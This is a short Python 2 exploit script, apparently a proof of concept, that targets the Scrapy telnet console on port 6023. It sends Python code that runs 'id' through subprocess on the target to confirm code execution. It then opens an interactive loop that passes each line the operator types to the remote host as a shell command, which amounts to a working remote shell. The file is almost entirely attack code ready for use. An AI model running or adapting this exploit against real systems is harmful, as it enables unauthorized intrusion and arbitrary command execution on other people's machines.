#!/usr/bin/env python
# coding: utf-8
# author: nullPoint3r

import sys
import getopt
import socket

target_host = ''
target_port = 6023

def usage():
    print "Usage: python scrapy_PoC.py -t target_host [-p port]\n"
    print "Settings:\n\tdefault port is 6023\n"
    print "Example: python scrapy.py -t 192.168.1.100 -p 6023\n"
    sys.exit(0)

def main():
    global target_host
    global target_port

    if not len(sys.argv[1:]):
        usage()
    
    try:
        opts, args = getopt.getopt(sys.argv[1:],"ht:p:")
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    for op, value in opts:
        if op == "-t":
            target_host = value
        elif op == "-p":
            target_port = int(value)
        elif op == "-h":
            usage()
        else:
            assert False,"Unhandled Option"

    print "[*] Testing..."
    connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect.settimeout(30)
    try:
        connect.connect((target_host,target_port))
        connect.send("import subprocess\r\nprint subprocess.Popen(\"id\", shell=True, stdout=subprocess.PIPE).stdout.read()\r\n")
        response = connect.recv(4096)
        if response.find('uid') > 0:
            print "[*] Target exploitable!\n"
            print "[*] You can execute arbitrarily code!\n"
        else:
            print "[*] Target not exploitable."
            connect.close()
            sys.exit(0)      

        start_shell = True
        while True:
            recv_len = 1
            response = ""
            
            if not start_shell:            
                while recv_len:
                    data = connect.recv(4096)
                    recv_len = len(data)
                    response+=data
                    if recv_len < 4096:
                        break
                print response
            
            user_input = raw_input("")
            command = "print subprocess.Popen(\"%s\", shell=True, stdout=subprocess.PIPE).stdout.read()\r\n" % user_input
            connect.send(command)
            start_shell = False     
    except BaseException, Argument:
        print "[*] %s" % Argument
        connect.close()

main()
